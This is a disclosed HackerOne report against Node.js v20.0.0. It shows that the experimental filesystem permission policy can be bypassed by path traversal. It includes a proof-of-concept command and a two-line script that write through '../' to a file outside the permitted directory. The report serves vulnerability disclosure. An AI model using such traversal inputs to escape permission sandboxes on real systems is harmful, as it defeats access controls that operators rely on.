# Filesystem experimental permissions policy does not handle path traversal cases.

## Report Details
- **Report ID**: 1952978
- **URL**: https://hackerone.com/reports/1952978
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-04-18T18:34:13.285Z
- **Disclosed**: 2023-07-20T20:57:35.392Z

## Reporter
- **Username**: haxatron1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
Consider the following command on Node v20.0.0:
```
node --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js
```
This command is intended to restrict write access to only files present in the directory /home/kali/restricted

However if we have the following poc.js:
```
const fs = module.require('fs')
fs.writeFileSync("/home/kali/restricted/../secret.txt", "Target Overwritten!")
```
This apparently matches the directory /home/kali/restricted/ directory check and then writes to /home/kali/secret.txt (by using ../), which is not intended, bypassing the experimental permission policy for files.

## Impact

Path traversal when checking experimental file permission policy

## Attachments
No attachments
